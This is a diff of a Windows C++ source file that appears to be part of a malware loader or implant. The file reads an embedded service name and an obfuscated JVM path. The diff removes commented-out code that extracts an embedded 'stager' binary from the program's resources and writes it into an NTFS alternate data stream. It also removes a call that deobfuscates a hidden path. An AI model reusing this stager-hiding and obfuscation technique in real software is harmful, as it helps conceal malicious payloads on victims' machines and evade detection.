@@ -79,41 +79,6 @@ int main(int argc, char* argv[]){
 
 }
 
-////=========================================================================
-///**
-//	Extract the stager and write to ADS
-//*/
-//void ExtractStager( char* passedPath ){
-//
-//    HGLOBAL hResourceLoaded;  // handle to loaded resource
-//    HRSRC   hRes;              // handle/ptr to res. info.
-//    char    *lpResLock;        // pointer to resource data
-//    DWORD   dwSizeRes;
-//    std::string strOutputLocation;
-//    std::string strAppLocation;
-//		
-//	//Get the resource
-//	hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_BIN1) ,"BIN");
-//
-//    hResourceLoaded = LoadResource(NULL, hRes);
-//    lpResLock = (char *) LockResource(hResourceLoaded);
-//    dwSizeRes = SizeofResource(NULL, hRes);
-//
-//	DWORD dwRet = 0;
-//	std::string classPath = passedPath;
-//	classPath.append(COLON);
-//
-//	HANDLE hStream = CreateFile( classPath.c_str(), GENERIC_WRITE,
-//                             FILE_SHARE_WRITE, NULL,
-//                             OPEN_ALWAYS, 0, NULL );
-//
-//    if( hStream != INVALID_HANDLE_VALUE ){
-//         WriteFile(hStream, lpResLock, dwSizeRes, &dwRet, NULL);
-//		CloseHandle(hStream);
-//	}
-//
-//}
-
 //=========================================================================
 /**
 	Attempt to get the service name embedded in the file
@@ -147,13 +112,6 @@ void ReadServiceDescription( std::string* svcDesc ) {
 	Attempt to get the java path embedded in the file
 */
 void ReadJavaPath( std::string* passedPath ) {	
-	//char javaPath[MAX_PATH];
-	//LoadString(NULL, IDS_PATH, javaPath, MAX_PATH );	
-
-	////Deobfuscate it
-	//char *tmp_ptr = decode_split(javaPath, 200);
-	//passedPath->assign(tmp_ptr);
-	//free(tmp_ptr);
 
 	//Get jvm string from resource table
 	char jvm_buf[400];
